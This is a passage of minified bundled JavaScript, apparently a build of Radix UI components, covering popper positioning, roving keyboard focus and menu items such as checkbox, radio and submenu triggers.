        children: j
    })
}
;
Popper.displayName = POPPER_NAME;
var ANCHOR_NAME$1 = "PopperAnchor"
  , PopperAnchor = reactExports.forwardRef( (_, M) => {
    const {__scopePopper: j, virtualRef: O, ...x} = _
      , w = usePopperContext(ANCHOR_NAME$1, j)
      , b = reactExports.useRef(null)
      , X = useComposedRefs(M, b);
    return reactExports.useEffect( () => {
        w.onAnchorChange((O == null ? void 0 : O.current) || b.current)
    }
    ),
    O ? null : jsxRuntimeExports.jsx(Primitive$1.div, {
        ...x,
        ref: X
    })
}
);
PopperAnchor.displayName = ANCHOR_NAME$1;
var CONTENT_NAME$4 = "PopperContent"
  , [PopperContentProvider,useContentContext] = createPopperContext(CONTENT_NAME$4)
  , PopperContent = reactExports.forwardRef( (_, M) => {
    var Te, Le, Ze, $e, Ne, qe;
    const {__scopePopper: j, side: O="bottom", sideOffset: x=0, align: w="center", alignOffset: b=0, arrowPadding: X=0, avoidCollisions: Y=!0, collisionBoundary: F=[], collisionPadding: V=0, sticky: K="partial", hideWhenDetached: Q=!1, updatePositionStrategy: ee="optimized", onPlaced: ae, ...ne} = _
      , oe = usePopperContext(CONTENT_NAME$4, j)
      , [ue,fe] = reactExports.useState(null)
      , he = useComposedRefs(M, Ve => fe(Ve))
      , [pe,ye] = reactExports.useState(null)
      , be = useSize(pe)
      , xe = (be == null ? void 0 : be.width) ?? 0
      , Ae = (be == null ? void 0 : be.height) ?? 0
      , Ee = O + (w !== "center" ? "-" + w : "")
      , Be = typeof V == "number" ? V : {
        top: 0,
        right: 0,
        bottom: 0,
        left: 0,
        ...V
    }
      , ce = Array.isArray(F) ? F : [F]
      , q = ce.length > 0
      , L = {
        padding: Be,
        boundary: ce.filter(isNotNull),
        altBoundary: q
    }
      , {refs: U, floatingStyles: Z, placement: te, isPositioned: se, middlewareData: de} = useFloating({
        strategy: "fixed",
        placement: Ee,
        whileElementsMounted: (...Ve) => autoUpdate(...Ve, {
            animationFrame: ee === "always"
        }),
        elements: {
            reference: oe.anchor
        },
        middleware: [offset({
            mainAxis: x + Ae,
            alignmentAxis: b
        }), Y && shift({
            mainAxis: !0,
            crossAxis: !1,
            limiter: K === "partial" ? limitShift() : void 0,
            ...L
        }), Y && flip({
            ...L
        }), size({
            ...L,
            apply: ({elements: Ve, rects: lt, availableWidth: nt, availableHeight: je}) => {
                const {width: Ke, height: Qe} = lt.reference
                  , We = Ve.floating.style;
                We.setProperty("--radix-popper-available-width", `${nt}px`),
                We.setProperty("--radix-popper-available-height", `${je}px`),
                We.setProperty("--radix-popper-anchor-width", `${Ke}px`),
                We.setProperty("--radix-popper-anchor-height", `${Qe}px`)
            }
        }), pe && arrow({
            element: pe,
            padding: X
        }), transformOrigin({
            arrowWidth: xe,
            arrowHeight: Ae
        }), Q && hide({
            strategy: "referenceHidden",
            ...L
        })]
    })
      , [re,$] = getSideAndAlignFromPlacement(te)
      , ie = useCallbackRef$1(ae);
    useLayoutEffect2( () => {
        se && (ie == null || ie())
    }
    , [se, ie]);
    const ve = (Te = de.arrow) == null ? void 0 : Te.x
      , ge = (Le = de.arrow) == null ? void 0 : Le.y
      , Re = ((Ze = de.arrow) == null ? void 0 : Ze.centerOffset) !== 0
      , [Pe,Ie] = reactExports.useState();
    return useLayoutEffect2( () => {
        ue && Ie(window.getComputedStyle(ue).zIndex)
    }
    , [ue]),
    jsxRuntimeExports.jsx("div", {
        ref: U.setFloating,
        "data-radix-popper-content-wrapper": "",
        style: {
            ...Z,
            transform: se ? Z.transform : "translate(0, -200%)",
            minWidth: "max-content",
            zIndex: Pe,
            "--radix-popper-transform-origin": [($e = de.transformOrigin) == null ? void 0 : $e.x, (Ne = de.transformOrigin) == null ? void 0 : Ne.y].join(" "),
            ...((qe = de.hide) == null ? void 0 : qe.referenceHidden) && {
                visibility: "hidden",
                pointerEvents: "none"
            }
        },
        dir: _.dir,
        children: jsxRuntimeExports.jsx(PopperContentProvider, {
            scope: j,
            placedSide: re,
            onArrowChange: ye,
            arrowX: ve,
            arrowY: ge,
            shouldHideArrow: Re,
            children: jsxRuntimeExports.jsx(Primitive$1.div, {
                "data-side": re,
                "data-align": $,
                ...ne,
                ref: he,
                style: {
                    ...ne.style,
                    animation: se ? void 0 : "none"
                }
            })
        })
    })
}
);
PopperContent.displayName = CONTENT_NAME$4;
var ARROW_NAME$4 = "PopperArrow"
  , OPPOSITE_SIDE = {
    top: "bottom",
    right: "left",
    bottom: "top",
    left: "right"
}
  , PopperArrow = reactExports.forwardRef(function(M, j) {
    const {__scopePopper: O, ...x} = M
      , w = useContentContext(ARROW_NAME$4, O)
      , b = OPPOSITE_SIDE[w.placedSide];
    return jsxRuntimeExports.jsx("span", {
        ref: w.onArrowChange,
        style: {
            position: "absolute",
            left: w.arrowX,
            top: w.arrowY,
            [b]: 0,
            transformOrigin: {
                top: "",
                right: "0 0",
                bottom: "center 0",
                left: "100% 0"
            }[w.placedSide],
            transform: {
                top: "translateY(100%)",
                right: "translateY(50%) rotate(90deg) translateX(-50%)",
                bottom: "rotate(180deg)",
                left: "translateY(50%) rotate(-90deg) translateX(50%)"
            }[w.placedSide],
            visibility: w.shouldHideArrow ? "hidden" : void 0
        },
        children: jsxRuntimeExports.jsx(Root$2, {
            ...x,
            ref: j,
            style: {
                ...x.style,
                display: "block"
            }
        })
    })
});
PopperArrow.displayName = ARROW_NAME$4;
function isNotNull(_) {
    return _ !== null
}
var transformOrigin = _ => ({
    name: "transformOrigin",
    options: _,
    fn(M) {
        var oe, ue, fe;
        const {placement: j, rects: O, middlewareData: x} = M
          , b = ((oe = x.arrow) == null ? void 0 : oe.centerOffset) !== 0
          , X = b ? 0 : _.arrowWidth
          , Y = b ? 0 : _.arrowHeight
          , [F,V] = getSideAndAlignFromPlacement(j)
          , K = {
            start: "0%",
            center: "50%",
            end: "100%"
        }[V]
          , Q = (((ue = x.arrow) == null ? void 0 : ue.x) ?? 0) + X / 2
          , ee = (((fe = x.arrow) == null ? void 0 : fe.y) ?? 0) + Y / 2;
        let ae = ""
          , ne = "";
        return F === "bottom" ? (ae = b ? K : `${Q}px`,
        ne = `${-Y}px`) : F === "top" ? (ae = b ? K : `${Q}px`,
        ne = `${O.floating.height + Y}px`) : F === "right" ? (ae = `${-Y}px`,
        ne = b ? K : `${ee}px`) : F === "left" && (ae = `${O.floating.width + Y}px`,
        ne = b ? K : `${ee}px`),
        {
            data: {
                x: ae,
                y: ne
            }
        }
    }
});
function getSideAndAlignFromPlacement(_) {
    const [M,j="center"] = _.split("-");
    return [M, j]
}
var Root2$1 = Popper
  , Anchor = PopperAnchor
  , Content = PopperContent
  , Arrow = PopperArrow
  , ENTRY_FOCUS = "rovingFocusGroup.onEntryFocus"
  , EVENT_OPTIONS = {
    bubbles: !1,
    cancelable: !0
}
  , GROUP_NAME$3 = "RovingFocusGroup"
  , [Collection$2,useCollection$2,createCollectionScope$2] = createCollection(GROUP_NAME$3)
  , [createRovingFocusGroupContext,createRovingFocusGroupScope] = createContextScope(GROUP_NAME$3, [createCollectionScope$2])
  , [RovingFocusProvider,useRovingFocusContext] = createRovingFocusGroupContext(GROUP_NAME$3)
  , RovingFocusGroup = reactExports.forwardRef( (_, M) => jsxRuntimeExports.jsx(Collection$2.Provider, {
    scope: _.__scopeRovingFocusGroup,
    children: jsxRuntimeExports.jsx(Collection$2.Slot, {
        scope: _.__scopeRovingFocusGroup,
        children: jsxRuntimeExports.jsx(RovingFocusGroupImpl, {
            ..._,
            ref: M
        })
    })
}));
RovingFocusGroup.displayName = GROUP_NAME$3;
var RovingFocusGroupImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeRovingFocusGroup: j, orientation: O, loop: x=!1, dir: w, currentTabStopId: b, defaultCurrentTabStopId: X, onCurrentTabStopIdChange: Y, onEntryFocus: F, preventScrollOnEntryFocus: V=!1, ...K} = _
      , Q = reactExports.useRef(null)
      , ee = useComposedRefs(M, Q)
      , ae = useDirection(w)
      , [ne,oe] = useControllableState({
        prop: b,
        defaultProp: X ?? null,
        onChange: Y,
        caller: GROUP_NAME$3
    })
      , [ue,fe] = reactExports.useState(!1)
      , he = useCallbackRef$1(F)
      , pe = useCollection$2(j)
      , ye = reactExports.useRef(!1)
      , [be,xe] = reactExports.useState(0);
    return reactExports.useEffect( () => {
        const Ae = Q.current;
        if (Ae)
            return Ae.addEventListener(ENTRY_FOCUS, he),
            () => Ae.removeEventListener(ENTRY_FOCUS, he)
    }
    , [he]),
    jsxRuntimeExports.jsx(RovingFocusProvider, {
        scope: j,
        orientation: O,
        dir: ae,
        loop: x,
        currentTabStopId: ne,
        onItemFocus: reactExports.useCallback(Ae => oe(Ae), [oe]),
        onItemShiftTab: reactExports.useCallback( () => fe(!0), []),
        onFocusableItemAdd: reactExports.useCallback( () => xe(Ae => Ae + 1), []),
        onFocusableItemRemove: reactExports.useCallback( () => xe(Ae => Ae - 1), []),
        children: jsxRuntimeExports.jsx(Primitive$1.div, {
            tabIndex: ue || be === 0 ? -1 : 0,
            "data-orientation": O,
            ...K,
            ref: ee,
            style: {
                outline: "none",
                ..._.style
            },
            onMouseDown: composeEventHandlers$1(_.onMouseDown, () => {
                ye.current = !0
            }
            ),
            onFocus: composeEventHandlers$1(_.onFocus, Ae => {
                const Ee = !ye.current;
                if (Ae.target === Ae.currentTarget && Ee && !ue) {
                    const Be = new CustomEvent(ENTRY_FOCUS,EVENT_OPTIONS);
                    if (Ae.currentTarget.dispatchEvent(Be),
                    !Be.defaultPrevented) {
                        const ce = pe().filter(te => te.focusable)
                          , q = ce.find(te => te.active)
                          , L = ce.find(te => te.id === ne)
                          , Z = [q, L, ...ce].filter(Boolean).map(te => te.ref.current);
                        focusFirst$1(Z, V)
                    }
                }
                ye.current = !1
            }
            ),
            onBlur: composeEventHandlers$1(_.onBlur, () => fe(!1))
        })
    })
}
)
  , ITEM_NAME$3 = "RovingFocusGroupItem"
  , RovingFocusGroupItem = reactExports.forwardRef( (_, M) => {
    const {__scopeRovingFocusGroup: j, focusable: O=!0, active: x=!1, tabStopId: w, children: b, ...X} = _
      , Y = useId()
      , F = w || Y
      , V = useRovingFocusContext(ITEM_NAME$3, j)
      , K = V.currentTabStopId === F
      , Q = useCollection$2(j)
      , {onFocusableItemAdd: ee, onFocusableItemRemove: ae, currentTabStopId: ne} = V;
    return reactExports.useEffect( () => {
        if (O)
            return ee(),
            () => ae()
    }
    , [O, ee, ae]),
    jsxRuntimeExports.jsx(Collection$2.ItemSlot, {
        scope: j,
        id: F,
        focusable: O,
        active: x,
        children: jsxRuntimeExports.jsx(Primitive$1.span, {
            tabIndex: K ? 0 : -1,
            "data-orientation": V.orientation,
            ...X,
            ref: M,
            onMouseDown: composeEventHandlers$1(_.onMouseDown, oe => {
                O ? V.onItemFocus(F) : oe.preventDefault()
            }
            ),
            onFocus: composeEventHandlers$1(_.onFocus, () => V.onItemFocus(F)),
            onKeyDown: composeEventHandlers$1(_.onKeyDown, oe => {
                if (oe.key === "Tab" && oe.shiftKey) {
                    V.onItemShiftTab();
                    return
                }
                if (oe.target !== oe.currentTarget)
                    return;
                const ue = getFocusIntent(oe, V.orientation, V.dir);
                if (ue !== void 0) {
                    if (oe.metaKey || oe.ctrlKey || oe.altKey || oe.shiftKey)
                        return;
                    oe.preventDefault();
                    let he = Q().filter(pe => pe.focusable).map(pe => pe.ref.current);
                    if (ue === "last")
                        he.reverse();
                    else if (ue === "prev" || ue === "next") {
                        ue === "prev" && he.reverse();
                        const pe = he.indexOf(oe.currentTarget);
                        he = V.loop ? wrapArray$2(he, pe + 1) : he.slice(pe + 1)
                    }
                    setTimeout( () => focusFirst$1(he))
                }
            }
            ),
            children: typeof b == "function" ? b({
                isCurrentTabStop: K,
                hasTabStop: ne != null
            }) : b
        })
    })
}
);
RovingFocusGroupItem.displayName = ITEM_NAME$3;
var MAP_KEY_TO_FOCUS_INTENT = {
    ArrowLeft: "prev",
    ArrowUp: "prev",
    ArrowRight: "next",
    ArrowDown: "next",
    PageUp: "first",
    Home: "first",
    PageDown: "last",
    End: "last"
};
function getDirectionAwareKey(_, M) {
    return M !== "rtl" ? _ : _ === "ArrowLeft" ? "ArrowRight" : _ === "ArrowRight" ? "ArrowLeft" : _
}
function getFocusIntent(_, M, j) {
    const O = getDirectionAwareKey(_.key, j);
    if (!(M === "vertical" && ["ArrowLeft", "ArrowRight"].includes(O)) && !(M === "horizontal" && ["ArrowUp", "ArrowDown"].includes(O)))
        return MAP_KEY_TO_FOCUS_INTENT[O]
}
function focusFirst$1(_, M=!1) {
    const j = document.activeElement;
    for (const O of _)
        if (O === j || (O.focus({
            preventScroll: M
        }),
        document.activeElement !== j))
            return
}
function wrapArray$2(_, M) {
    return _.map( (j, O) => _[(M + O) % _.length])
}
var Root$1 = RovingFocusGroup
  , Item$1 = RovingFocusGroupItem
  , SELECTION_KEYS$1 = ["Enter", " "]
  , FIRST_KEYS = ["ArrowDown", "PageUp", "Home"]
  , LAST_KEYS = ["ArrowUp", "PageDown", "End"]
  , FIRST_LAST_KEYS = [...FIRST_KEYS, ...LAST_KEYS]
  , SUB_OPEN_KEYS = {
    ltr: [...SELECTION_KEYS$1, "ArrowRight"],
    rtl: [...SELECTION_KEYS$1, "ArrowLeft"]
}
  , SUB_CLOSE_KEYS = {
    ltr: ["ArrowLeft"],
    rtl: ["ArrowRight"]
}
  , MENU_NAME = "Menu"
  , [Collection$1,useCollection$1,createCollectionScope$1] = createCollection(MENU_NAME)
  , [createMenuContext,createMenuScope] = createContextScope(MENU_NAME, [createCollectionScope$1, createPopperScope, createRovingFocusGroupScope])
  , usePopperScope$2 = createPopperScope()
  , useRovingFocusGroupScope = createRovingFocusGroupScope()
  , [MenuProvider,useMenuContext] = createMenuContext(MENU_NAME)
  , [MenuRootProvider,useMenuRootContext] = createMenuContext(MENU_NAME)
  , ANCHOR_NAME = "MenuAnchor"
  , MenuAnchor = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, ...O} = _
      , x = usePopperScope$2(j);
    return jsxRuntimeExports.jsx(Anchor, {
        ...x,
        ...O,
        ref: M
    })
}
);
MenuAnchor.displayName = ANCHOR_NAME;
var PORTAL_NAME$3 = "MenuPortal"
  , [PortalProvider$1,usePortalContext$1] = createMenuContext(PORTAL_NAME$3, {
    forceMount: void 0
})
  , MenuPortal = _ => {
    const {__scopeMenu: M, forceMount: j, children: O, container: x} = _
      , w = useMenuContext(PORTAL_NAME$3, M);
    return jsxRuntimeExports.jsx(PortalProvider$1, {
        scope: M,
        forceMount: j,
        children: jsxRuntimeExports.jsx(Presence, {
            present: j || w.open,
            children: jsxRuntimeExports.jsx(Portal$4, {
                asChild: !0,
                container: x,
                children: O
            })
        })
    })
}
;
MenuPortal.displayName = PORTAL_NAME$3;
var CONTENT_NAME$3 = "MenuContent"
  , [MenuContentProvider,useMenuContentContext] = createMenuContext(CONTENT_NAME$3)
  , MenuContent = reactExports.forwardRef( (_, M) => {
    const j = usePortalContext$1(CONTENT_NAME$3, _.__scopeMenu)
      , {forceMount: O=j.forceMount, ...x} = _
      , w = useMenuContext(CONTENT_NAME$3, _.__scopeMenu)
      , b = useMenuRootContext(CONTENT_NAME$3, _.__scopeMenu);
    return jsxRuntimeExports.jsx(Collection$1.Provider, {
        scope: _.__scopeMenu,
        children: jsxRuntimeExports.jsx(Presence, {
            present: O || w.open,
            children: jsxRuntimeExports.jsx(Collection$1.Slot, {
                scope: _.__scopeMenu,
                children: b.modal ? jsxRuntimeExports.jsx(MenuRootContentModal, {
                    ...x,
                    ref: M
                }) : jsxRuntimeExports.jsx(MenuRootContentNonModal, {
                    ...x,
                    ref: M
                })
            })
        })
    })
}
)
  , MenuRootContentModal = reactExports.forwardRef( (_, M) => {
    const j = useMenuContext(CONTENT_NAME$3, _.__scopeMenu)
      , O = reactExports.useRef(null)
      , x = useComposedRefs(M, O);
    return reactExports.useEffect( () => {
        const w = O.current;
        if (w)
            return hideOthers(w)
    }
    , []),
    jsxRuntimeExports.jsx(MenuContentImpl, {
        ..._,
        ref: x,
        trapFocus: j.open,
        disableOutsidePointerEvents: j.open,
        disableOutsideScroll: !0,
        onFocusOutside: composeEventHandlers$1(_.onFocusOutside, w => w.preventDefault(), {
            checkForDefaultPrevented: !1
        }),
        onDismiss: () => j.onOpenChange(!1)
    })
}
)
  , MenuRootContentNonModal = reactExports.forwardRef( (_, M) => {
    const j = useMenuContext(CONTENT_NAME$3, _.__scopeMenu);
    return jsxRuntimeExports.jsx(MenuContentImpl, {
        ..._,
        ref: M,
        trapFocus: !1,
        disableOutsidePointerEvents: !1,
        disableOutsideScroll: !1,
        onDismiss: () => j.onOpenChange(!1)
    })
}
)
  , Slot$1 = createSlot("MenuContent.ScrollLock")
  , MenuContentImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, loop: O=!1, trapFocus: x, onOpenAutoFocus: w, onCloseAutoFocus: b, disableOutsidePointerEvents: X, onEntryFocus: Y, onEscapeKeyDown: F, onPointerDownOutside: V, onFocusOutside: K, onInteractOutside: Q, onDismiss: ee, disableOutsideScroll: ae, ...ne} = _
      , oe = useMenuContext(CONTENT_NAME$3, j)
      , ue = useMenuRootContext(CONTENT_NAME$3, j)
      , fe = usePopperScope$2(j)
      , he = useRovingFocusGroupScope(j)
      , pe = useCollection$1(j)
      , [ye,be] = reactExports.useState(null)
      , xe = reactExports.useRef(null)
      , Ae = useComposedRefs(M, xe, oe.onContentChange)
      , Ee = reactExports.useRef(0)
      , Be = reactExports.useRef("")
      , ce = reactExports.useRef(0)
      , q = reactExports.useRef(null)
      , L = reactExports.useRef("right")
      , U = reactExports.useRef(0)
      , Z = ae ? ReactRemoveScroll : reactExports.Fragment
      , te = ae ? {
        as: Slot$1,
        allowPinchZoom: !0
    } : void 0
      , se = re => {
        var Te, Le;
        const $ = Be.current + re
          , ie = pe().filter(Ze => !Ze.disabled)
          , ve = document.activeElement
          , ge = (Te = ie.find(Ze => Ze.ref.current === ve)) == null ? void 0 : Te.textValue
          , Re = ie.map(Ze => Ze.textValue)
          , Pe = getNextMatch(Re, $, ge)
          , Ie = (Le = ie.find(Ze => Ze.textValue === Pe)) == null ? void 0 : Le.ref.current;
        (function Ze($e) {
            Be.current = $e,
            window.clearTimeout(Ee.current),
            $e !== "" && (Ee.current = window.setTimeout( () => Ze(""), 1e3))
        }
        )($),
        Ie && setTimeout( () => Ie.focus())
    }
    ;
    reactExports.useEffect( () => () => window.clearTimeout(Ee.current), []),
    useFocusGuards();
    const de = reactExports.useCallback(re => {
        var ie, ve;
        return L.current === ((ie = q.current) == null ? void 0 : ie.side) && isPointerInGraceArea(re, (ve = q.current) == null ? void 0 : ve.area)
    }
    , []);
    return jsxRuntimeExports.jsx(MenuContentProvider, {
        scope: j,
        searchRef: Be,
        onItemEnter: reactExports.useCallback(re => {
            de(re) && re.preventDefault()
        }
        , [de]),
        onItemLeave: reactExports.useCallback(re => {
            var $;
            de(re) || (($ = xe.current) == null || $.focus(),
            be(null))
        }
        , [de]),
        onTriggerLeave: reactExports.useCallback(re => {
            de(re) && re.preventDefault()
        }
        , [de]),
        pointerGraceTimerRef: ce,
        onPointerGraceIntentChange: reactExports.useCallback(re => {
            q.current = re
        }
        , []),
        children: jsxRuntimeExports.jsx(Z, {
            ...te,
            children: jsxRuntimeExports.jsx(FocusScope, {
                asChild: !0,
                trapped: x,
                onMountAutoFocus: composeEventHandlers$1(w, re => {
                    var $;
                    re.preventDefault(),
                    ($ = xe.current) == null || $.focus({
                        preventScroll: !0
                    })
                }
                ),
                onUnmountAutoFocus: b,
                children: jsxRuntimeExports.jsx(DismissableLayer, {
                    asChild: !0,
                    disableOutsidePointerEvents: X,
                    onEscapeKeyDown: F,
                    onPointerDownOutside: V,
                    onFocusOutside: K,
                    onInteractOutside: Q,
                    onDismiss: ee,
                    children: jsxRuntimeExports.jsx(Root$1, {
                        asChild: !0,
                        ...he,
                        dir: ue.dir,
                        orientation: "vertical",
                        loop: O,
                        currentTabStopId: ye,
                        onCurrentTabStopIdChange: be,
                        onEntryFocus: composeEventHandlers$1(Y, re => {
                            ue.isUsingKeyboardRef.current || re.preventDefault()
                        }
                        ),
                        preventScrollOnEntryFocus: !0,
                        children: jsxRuntimeExports.jsx(Content, {
                            role: "menu",
                            "aria-orientation": "vertical",
                            "data-state": getOpenState(oe.open),
                            "data-radix-menu-content": "",
                            dir: ue.dir,
                            ...fe,
                            ...ne,
                            ref: Ae,
                            style: {
                                outline: "none",
                                ...ne.style
                            },
                            onKeyDown: composeEventHandlers$1(ne.onKeyDown, re => {
                                const ie = re.target.closest("[data-radix-menu-content]") === re.currentTarget
                                  , ve = re.ctrlKey || re.altKey || re.metaKey
                                  , ge = re.key.length === 1;
                                ie && (re.key === "Tab" && re.preventDefault(),
                                !ve && ge && se(re.key));
                                const Re = xe.current;
                                if (re.target !== Re || !FIRST_LAST_KEYS.includes(re.key))
                                    return;
                                re.preventDefault();
                                const Ie = pe().filter(Te => !Te.disabled).map(Te => Te.ref.current);
                                LAST_KEYS.includes(re.key) && Ie.reverse(),
                                focusFirst(Ie)
                            }
                            ),
                            onBlur: composeEventHandlers$1(_.onBlur, re => {
                                re.currentTarget.contains(re.target) || (window.clearTimeout(Ee.current),
                                Be.current = "")
                            }
                            ),
                            onPointerMove: composeEventHandlers$1(_.onPointerMove, whenMouse(re => {
                                const $ = re.target
                                  , ie = U.current !== re.clientX;
                                if (re.currentTarget.contains($) && ie) {
                                    const ve = re.clientX > U.current ? "right" : "left";
                                    L.current = ve,
                                    U.current = re.clientX
                                }
                            }
                            ))
                        })
                    })
                })
            })
        })
    })
}
);
MenuContent.displayName = CONTENT_NAME$3;
var GROUP_NAME$2 = "MenuGroup"
  , MenuGroup = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, ...O} = _;
    return jsxRuntimeExports.jsx(Primitive$1.div, {
        role: "group",
        ...O,
        ref: M
    })
}
);
MenuGroup.displayName = GROUP_NAME$2;
var LABEL_NAME$2 = "MenuLabel"
  , MenuLabel = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, ...O} = _;
    return jsxRuntimeExports.jsx(Primitive$1.div, {
        ...O,
        ref: M
    })
}
);
MenuLabel.displayName = LABEL_NAME$2;
var ITEM_NAME$2 = "MenuItem"
  , ITEM_SELECT = "menu.itemSelect"
  , MenuItem = reactExports.forwardRef( (_, M) => {
    const {disabled: j=!1, onSelect: O, ...x} = _
      , w = reactExports.useRef(null)
      , b = useMenuRootContext(ITEM_NAME$2, _.__scopeMenu)
      , X = useMenuContentContext(ITEM_NAME$2, _.__scopeMenu)
      , Y = useComposedRefs(M, w)
      , F = reactExports.useRef(!1)
      , V = () => {
        const K = w.current;
        if (!j && K) {
            const Q = new CustomEvent(ITEM_SELECT,{
                bubbles: !0,
                cancelable: !0
            });
            K.addEventListener(ITEM_SELECT, ee => O == null ? void 0 : O(ee), {
                once: !0
            }),
            dispatchDiscreteCustomEvent(K, Q),
            Q.defaultPrevented ? F.current = !1 : b.onClose()
        }
    }
    ;
    return jsxRuntimeExports.jsx(MenuItemImpl, {
        ...x,
        ref: Y,
        disabled: j,
        onClick: composeEventHandlers$1(_.onClick, V),
        onPointerDown: K => {
            var Q;
            (Q = _.onPointerDown) == null || Q.call(_, K),
            F.current = !0
        }
        ,
        onPointerUp: composeEventHandlers$1(_.onPointerUp, K => {
            var Q;
            F.current || (Q = K.currentTarget) == null || Q.click()
        }
        ),
        onKeyDown: composeEventHandlers$1(_.onKeyDown, K => {
            const Q = X.searchRef.current !== "";
            j || Q && K.key === " " || SELECTION_KEYS$1.includes(K.key) && (K.currentTarget.click(),
            K.preventDefault())
        }
        )
    })
}
);
MenuItem.displayName = ITEM_NAME$2;
var MenuItemImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, disabled: O=!1, textValue: x, ...w} = _
      , b = useMenuContentContext(ITEM_NAME$2, j)
      , X = useRovingFocusGroupScope(j)
      , Y = reactExports.useRef(null)
      , F = useComposedRefs(M, Y)
      , [V,K] = reactExports.useState(!1)
      , [Q,ee] = reactExports.useState("");
    return reactExports.useEffect( () => {
        const ae = Y.current;
        ae && ee((ae.textContent ?? "").trim())
    }
    , [w.children]),
    jsxRuntimeExports.jsx(Collection$1.ItemSlot, {
        scope: j,
        disabled: O,
        textValue: x ?? Q,
        children: jsxRuntimeExports.jsx(Item$1, {
            asChild: !0,
            ...X,
            focusable: !O,
            children: jsxRuntimeExports.jsx(Primitive$1.div, {
                role: "menuitem",
                "data-highlighted": V ? "" : void 0,
                "aria-disabled": O || void 0,
                "data-disabled": O ? "" : void 0,
                ...w,
                ref: F,
                onPointerMove: composeEventHandlers$1(_.onPointerMove, whenMouse(ae => {
                    O ? b.onItemLeave(ae) : (b.onItemEnter(ae),
                    ae.defaultPrevented || ae.currentTarget.focus({
                        preventScroll: !0
                    }))
                }
                )),
                onPointerLeave: composeEventHandlers$1(_.onPointerLeave, whenMouse(ae => b.onItemLeave(ae))),
                onFocus: composeEventHandlers$1(_.onFocus, () => K(!0)),
                onBlur: composeEventHandlers$1(_.onBlur, () => K(!1))
            })
        })
    })
}
)
  , CHECKBOX_ITEM_NAME$1 = "MenuCheckboxItem"
  , MenuCheckboxItem = reactExports.forwardRef( (_, M) => {
    const {checked: j=!1, onCheckedChange: O, ...x} = _;
    return jsxRuntimeExports.jsx(ItemIndicatorProvider, {
        scope: _.__scopeMenu,
        checked: j,
        children: jsxRuntimeExports.jsx(MenuItem, {
            role: "menuitemcheckbox",
            "aria-checked": isIndeterminate(j) ? "mixed" : j,
            ...x,
            ref: M,
            "data-state": getCheckedState(j),
            onSelect: composeEventHandlers$1(x.onSelect, () => O == null ? void 0 : O(isIndeterminate(j) ? !0 : !j), {
                checkForDefaultPrevented: !1
            })
        })
    })
}
);
MenuCheckboxItem.displayName = CHECKBOX_ITEM_NAME$1;
var RADIO_GROUP_NAME$1 = "MenuRadioGroup"
  , [RadioGroupProvider,useRadioGroupContext] = createMenuContext(RADIO_GROUP_NAME$1, {
    value: void 0,
    onValueChange: () => {}
})
  , MenuRadioGroup = reactExports.forwardRef( (_, M) => {
    const {value: j, onValueChange: O, ...x} = _
      , w = useCallbackRef$1(O);
    return jsxRuntimeExports.jsx(RadioGroupProvider, {
        scope: _.__scopeMenu,
        value: j,
        onValueChange: w,
        children: jsxRuntimeExports.jsx(MenuGroup, {
            ...x,
            ref: M
        })
    })
}
);
MenuRadioGroup.displayName = RADIO_GROUP_NAME$1;
var RADIO_ITEM_NAME$1 = "MenuRadioItem"
  , MenuRadioItem = reactExports.forwardRef( (_, M) => {
    const {value: j, ...O} = _
      , x = useRadioGroupContext(RADIO_ITEM_NAME$1, _.__scopeMenu)
      , w = j === x.value;
    return jsxRuntimeExports.jsx(ItemIndicatorProvider, {
        scope: _.__scopeMenu,
        checked: w,
        children: jsxRuntimeExports.jsx(MenuItem, {
            role: "menuitemradio",
            "aria-checked": w,
            ...O,
            ref: M,
            "data-state": getCheckedState(w),
            onSelect: composeEventHandlers$1(O.onSelect, () => {
                var b;
                return (b = x.onValueChange) == null ? void 0 : b.call(x, j)
            }
            , {
                checkForDefaultPrevented: !1
            })
        })
    })
}
);
MenuRadioItem.displayName = RADIO_ITEM_NAME$1;
var ITEM_INDICATOR_NAME$1 = "MenuItemIndicator"
  , [ItemIndicatorProvider,useItemIndicatorContext] = createMenuContext(ITEM_INDICATOR_NAME$1, {
    checked: !1
})
  , MenuItemIndicator = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, forceMount: O, ...x} = _
      , w = useItemIndicatorContext(ITEM_INDICATOR_NAME$1, j);
    return jsxRuntimeExports.jsx(Presence, {
        present: O || isIndeterminate(w.checked) || w.checked === !0,
        children: jsxRuntimeExports.jsx(Primitive$1.span, {
            ...x,
            ref: M,
            "data-state": getCheckedState(w.checked)
        })
    })
}
);
MenuItemIndicator.displayName = ITEM_INDICATOR_NAME$1;
var SEPARATOR_NAME$2 = "MenuSeparator"
  , MenuSeparator = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, ...O} = _;
    return jsxRuntimeExports.jsx(Primitive$1.div, {
        role: "separator",
        "aria-orientation": "horizontal",
        ...O,
        ref: M
    })
}
);
MenuSeparator.displayName = SEPARATOR_NAME$2;
var ARROW_NAME$3 = "MenuArrow"
  , MenuArrow = reactExports.forwardRef( (_, M) => {
    const {__scopeMenu: j, ...O} = _
      , x = usePopperScope$2(j);
    return jsxRuntimeExports.jsx(Arrow, {
        ...x,
        ...O,
        ref: M
    })
}
);
MenuArrow.displayName = ARROW_NAME$3;
var SUB_NAME = "MenuSub"
  , [MenuSubProvider,useMenuSubContext] = createMenuContext(SUB_NAME)
  , SUB_TRIGGER_NAME$1 = "MenuSubTrigger"
  , MenuSubTrigger = reactExports.forwardRef( (_, M) => {
    const j = useMenuContext(SUB_TRIGGER_NAME$1, _.__scopeMenu)
      , O = useMenuRootContext(SUB_TRIGGER_NAME$1, _.__scopeMenu)
      , x = useMenuSubContext(SUB_TRIGGER_NAME$1, _.__scopeMenu)
      , w = useMenuContentContext(SUB_TRIGGER_NAME$1, _.__scopeMenu)
      , b = reactExports.useRef(null)
      , {pointerGraceTimerRef: X, onPointerGraceIntentChange: Y} = w
      , F = {
        __scopeMenu: _.__scopeMenu
    }
      , V = reactExports.useCallback( () => {
        b.current && window.clearTimeout(b.current),
        b.current = null
    }
    , []);
    return reactExports.useEffect( () => V, [V]),
    reactExports.useEffect( () => {
        const K = X.current;
        return () => {
            window.clearTimeout(K),
            Y(null)
        }
    }
    , [X, Y]),
    jsxRuntimeExports.jsx(MenuAnchor, {
        asChild: !0,
        ...F,
